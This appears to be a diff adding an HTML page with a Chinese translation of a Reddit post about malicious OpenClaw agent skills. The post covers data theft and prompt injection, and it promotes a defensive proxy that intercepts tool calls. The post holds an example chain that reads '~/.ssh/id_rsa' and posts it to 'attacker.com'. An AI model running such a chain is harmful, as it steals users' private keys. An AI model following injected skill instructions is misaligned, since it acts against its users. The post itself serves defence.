@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>思科发现 OpenClaw 技能在静默窃取数据，我做了个代理来拦截它 - Reddit Insight</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Microsoft YaHei', sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; font-size: 14px; }
+    .container { max-width: 1000px; margin: 0 auto; padding: 0 15px; }
+    .header { background: #2d3748; padding: 15px 0; border-bottom: 3px solid #4a5568; }
+    .header h1 { font-size: 1.8em; font-weight: 700; color: #fff; margin: 0; }
+    .subtitle { color: #a0aec0; font-size: 0.9em; margin-top: 5px; }
+    .post-detail { background: #fff; border: 1px solid #e2e8f0; border-radius: 4px; margin: 20px 0; }
+    .post-header { background: #edf2f7; padding: 20px; border-bottom: 1px solid #e2e8f0; }
+    .post-header h1 { font-size: 1.4em; font-weight: 700; color: #2d3748; margin-bottom: 10px; }
+    .post-meta { color: #718096; font-size: 0.9em; }
+    .post-body { padding: 25px; }
+    .post-section { margin-bottom: 30px; }
+    .post-section h2 { font-size: 1.1em; font-weight: 700; color: #2d3748; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #e2e8f0; }
+    .summary-box { background: #f7fafc; border-left: 4px solid #4299e1; padding: 20px; border-radius: 0 4px 4px 0; }
+    .content-box { background: #fff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 4px; line-height: 1.9; }
+    .replies-section { margin-top: 30px; }
+    .reply-item { background: #f7fafc; border: 1px solid #e2e8f0; border-radius: 4px; padding: 15px; margin-bottom: 15px; }
+    .reply-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid #e2e8f0; }
+    .reply-num { background: #4299e1; color: #fff; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.85em; }
+    .links-box { background: #f7fafc; padding: 15px 20px; border-top: 1px solid #e2e8f0; }
+    .links-box a { color: #4299e1; text-decoration: none; }
+    .post-footer-bar { background: #edf2f7; padding: 15px 20px; border-top: 1px solid #e2e8f0; display: flex; gap: 10px; }
+    .btn { padding: 8px 16px; border-radius: 4px; text-decoration: none; font-size: 0.9em; font-weight: 500; display: inline-block; }
+    .btn-primary { background: #4299e1; color: #fff; }
+    .btn-outline { background: #fff; color: #4a5568; border: 1px solid #cbd5e0; }
+    .footer { background: #2d3748; color: #a0aec0; text-align: center; padding: 20px; margin-top: 30px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="container">
+      <h1>📋 Reddit Insight</h1>
+      <p class="subtitle">OpenClaw 社区每日精选</p>
+    </div>
+  </header>
+  
+  <div class="container">
+    <article class="post-detail">
+      <header class="post-header">
+        <h1>思科发现 OpenClaw 技能在静默窃取数据，我做了个代理来拦截它</h1>
+        <div class="post-meta">
+          <span>👤 Puzzleh33t</span> | <span>📅 2026/3/21</span>
+        </div>
+      </header>
+      
+      <div class="post-body">
+        
+        <section class="post-section">
+          <h2>📋 内容摘要</h2>
+          <div class="summary-box"><ul>
+<li>OpenClaw等AI Agent存在严重安全隐患：恶意技能可通过文件读取、网络请求等看似无害的操作链实现数据窃取和远程代码执行</li>
+<li>核心问题在于Agent拥有文件系统、Shell和网络权限，但缺乏意图与实际执行之间的有效隔离边界</li>
+<li>作者开发了McpVanguard代理工具，通过模式匹配、语义分析和行为链检测在调用执行前拦截恶意操作</li>
+<li>更深层的VEX协议提供Merkle审计追踪、TPM身份认证和系统调用级强制执行，实现完整的安全治理</li>
+<li>审计日志本身具有重要价值：即使不主动拦截，仅记录&quot;实际运行 vs 请求内容&quot;的差异就能暴露大量威胁</li>
+</ul>
+</div>
+        </section>
+        
+        
+        
+        <section class="post-section">
+          <h2>📝 正文翻译</h2>
+          <div class="content-box"><p>Cisco AI 安全团队测试了一款第三方 OpenClaw 技能，发现它在用户毫不知情的情况下执行数据外泄和提示注入。ClawHub 高峰期曾有 820 多个恶意技能。CVE-2026-25253 让攻击者仅通过一个恶意链接就能实现 RCE。</p>
+<p>这些并非 OpenClaw 本身的漏洞。而是当智能体拥有文件系统访问、Shell 执行和网络调用能力时——且其意图与实际操作之间缺乏强制隔离边界——必然会出现的问题。</p>
+<p>反复出现的模式是这样的：
+read_file(&quot;~/.ssh/id_rsa&quot;) → http_post(&quot;attacker.com&quot;, contents)
+单独看，两个调用都无可疑之处。组合起来，就是一次数据泄露。技能层面的验证无法捕获这种链式调用。</p>
+<p>我开发了 McpVanguard，部署在智能体与其工具之间，在执行前拦截恶意调用——包括模式匹配、语义意图评分、以及跨会话的行为链检测。</p>
+<p>pip install mcp-vanguard</p>
+<p>更深一层是 VEX 协议（飞行记录仪）——Merkle 审计追踪、基于 TPM 的智能体身份认证、系统调用级强制管控。Rust 编写，去年 12 月启动，早于 OpenClaw 爆火之前。</p>
+<p><a href="https://github.com/provnai/McpVanguard">https://github.com/provnai/McpVanguard</a>
+<a href="https://github.com/provnai/vex">https://github.com/provnai/vex</a></p>
+<p>NVIDIA 刚刚发布了面向安全场景的 NemoClaw。这个问题不会消失。</p>
+</div>
+        </section>
+        
+        
+        
+        <section class="post-section replies-section">
+          <h2>💬 OP 回复译文 (1 条)</h2>
+          
+          <div class="reply-item">
+            <div class="reply-header">
+              <span class="reply-num">1</span>
+              <span>楼主回复</span>
+            </div>
+            <div class="reply-content"><p>这一点恰恰也被低估了。在采取主动拦截之前，光是建立一条审计轨迹，记录实际执行的与请求的内容之间的差异，就能发现大量问题。ClawHub 那一半的安全事件，要是有人能看到运行时真实的调用链，估计早就发现了。</p>
+<p>代理方案允许你从纯审计模式起步（VANGUARD_MODE=audit），这样无需触碰生产环境的任何东西就能获得可见性——说实话，光是这一点就值了。</p>
+</div>
+          </div>
+          
+        </section>
+        
+      </div>
+      
+      <div class="links-box">
+        🔗 <a href="https://www.reddit.com/r/openclaw/comments/1rz23za/cisco_found_openclaw_skills_doing_silent_data/" target="_blank">查看 Reddit 原文</a>
+      </div>
+      
+      <div class="post-footer-bar">
+        <a href="/" class="btn btn-primary">← 返回列表</a>
+      </div>
+    </article>
+  </div>
+  
+  <footer class="footer">
+    <p>© 2026 Reddit Insight | 自动抓取翻译</p>
+  </footer>
+</body>
+</html>
